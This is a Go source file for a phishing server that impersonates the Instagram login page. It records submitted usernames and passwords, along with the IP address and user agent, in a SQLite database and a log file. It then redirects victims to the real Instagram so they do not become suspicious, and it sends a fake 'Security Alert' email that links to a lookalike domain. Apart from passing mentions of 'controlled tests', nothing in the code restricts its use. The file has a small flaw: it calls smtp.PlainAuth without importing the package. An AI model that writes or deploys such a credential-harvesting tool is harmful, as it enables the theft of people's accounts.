package main

import (
    "database/sql"
    "fmt"
    "html/template"
    "log"
    "net/http"
    "os"
    "time"

    "github.com/google/uuid"
    "github.com/jordan-wright/email"
    _ "github.com/mattn/go-sqlite3"
)

// LoginData struct to store form data
type LoginData struct {
    ID        int
    Username  string
    Password  string
    IP        string
    UserAgent string
    Timestamp string
    SessionID string
}

// HTML template for fake Instagram login page
const loginTemplate = `
<!DOCTYPE html>
<html>
<head>
    <title>Instagram Login</title>
    <style>
        body { font-family: Arial, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; background: #fafafa; }
        .container { background: white; padding: 30px; border-radius: 10px; box-shadow: 0 0 15px rgba(0,0,0,0.1); width: 350px; text-align: center; }
        h2 { color: #262626; font-size: 24px; margin-bottom: 20px; }
        input[type="text"], input[type="password"] { width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #dbdbdb; border-radius: 5px; font-size: 14px; }
        input[type="submit"] { background: #0095f6; color: white; padding: 12px; border: none; border-radius: 5px; cursor: pointer; width: 100%; font-size: 16px; }
        input[type="submit"]:hover { background: #0074cc; }
        .error { color: red; font-size: 14px; }
    </style>
</head>
<body>
    <div class="container">
        <h2>Instagram Login</h2>
        <form action="/login" method="POST">
            <input type="hidden" name="csrf_token" value="{{.CSRFToken}}">
            <input type="text" name="username" placeholder="Username" required><br>
            <input type="password" name="password" placeholder="Password" required><br>
            <input type="submit" value="Log In">
        </form>
    </div>
</body>
</html>
`

func main() {
    // Initialize SQLite database
    db, err := sql.Open("sqlite3", "./phishing_log.db")
    if err != nil {
        log.Fatal("Error connecting to database:", err)
    }
    defer db.Close()

    // Create table for storing login attempts
    _, err = db.Exec(`
        CREATE TABLE IF NOT EXISTS logins (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            username TEXT,
            password TEXT,
            ip TEXT,
            user_agent TEXT,
            timestamp TEXT,
            session_id TEXT
        )`)
    if err != nil {
        log.Fatal("Error creating table:", err)
    }

    // Initialize log file
    logFile, err := os.OpenFile("phishing_attempts.log", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
    if err != nil {
        log.Fatal("Error opening log file:", err)
    }
    defer logFile.Close()
    logger := log.New(logFile, "PHISHING: ", log.LstdFlags)

    // Define routes
    http.HandleFunc("/", loginPage)
    http.HandleFunc("/login", handleLogin(db, logger))

    // Start server
    fmt.Println("Server running on port 8080...")
    log.Fatal(http.ListenAndServe(":8080", nil))
}

// loginPage handles the display of the fake login page
func loginPage(w http.ResponseWriter, r *http.Request) {
    t, err := template.New("login").Parse(loginTemplate)
    if err != nil {
        http.Error(w, "Error loading page", http.StatusInternalServerError)
        return
    }

    // Generate CSRF token (simulated for realism)
    csrfToken := uuid.New().String()
    data := struct {
        CSRFToken string
    }{CSRFToken: csrfToken}

    t.Execute(w, data)
}

// handleLogin processes form submissions
func handleLogin(db *sql.DB, logger *log.Logger) http.HandlerFunc {
    return func(w http.ResponseWriter, r *http.Request) {
        if r.Method != http.MethodPost {
            http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
            return
        }

        // Parse form data
        username := r.FormValue("username")
        password := r.FormValue("password")
        ip := r.RemoteAddr
        userAgent := r.UserAgent()
        timestamp := time.Now().Format(time.RFC3339)
        sessionID := uuid.New().String()

        // Log to file
        logger.Printf("Username: %s, Password: %s, IP: %s, User-Agent: %s, SessionID: %s", username, password, ip, userAgent, sessionID)

        // Store in database
        _, err := db.Exec(
            "INSERT INTO logins (username, password, ip, user_agent, timestamp, session_id) VALUES (?, ?, ?, ?, ?, ?)",
            username, password, ip, userAgent, timestamp, sessionID)
        if err != nil {
            logger.Println("Error storing data:", err)
            http.Error(w, "Server error", http.StatusInternalServerError)
            return
        }

        // Send phishing email (simulated)
        err = sendPhishingEmail(username)
        if err != nil {
            logger.Println("Error sending email:", err)
        }

        // Redirect to real Instagram to avoid suspicion
        http.Redirect(w, r, "https://www.instagram.com", http.StatusFound)
    }
}

// sendPhishingEmail sends a fake phishing email
func sendPhishingEmail(username string) error {
    e := email.NewEmail()
    e.From = "no-reply@fake-instagram.com"
    e.To = []string{username + "@example.com"} // Replace with real email in controlled tests
    e.Subject = "Security Alert: Suspicious Login Attempt"
    e.Text = []byte("Someone tried to log into your Instagram account. Click here to verify your identity: http://fake-instagram.com/verify")

    // SMTP configuration (replace with your SMTP server details)
    err := e.Send("smtp.gmail.com:587", smtp.PlainAuth("", "your-email@gmail.com", "your-app-password", "smtp.gmail.com"))
    if err != nil {
        return err
    }
    return nil
}
